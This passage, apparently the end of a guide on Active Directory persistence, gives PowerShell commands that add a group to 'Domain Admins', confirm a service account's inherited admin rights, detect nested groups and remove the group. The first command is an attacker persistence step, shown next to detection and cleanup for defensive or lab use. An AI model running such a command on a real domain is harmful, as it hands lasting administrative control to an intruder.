Add-ADGroupMember -Identity "Domain Admins" -Members "BackupOps"
```

### Verify Persistence
```powershell
Get-ADGroupMember -Identity "Domain Admins" -Recursive | Where-Object { $_.SamAccountName -eq "svc_backup" }
```

### Detect Nested Groups
```powershell
Get-ADGroupMember -Identity "Domain Admins" | Where-Object { $_.ObjectClass -eq "group" }
```

### Remediate
```powershell
Remove-ADGroupMember -Identity "Domain Admins" -Members "BackupOps" -Confirm:$false
Remove-ADGroup -Identity "BackupOps" -Confirm:$false
```

---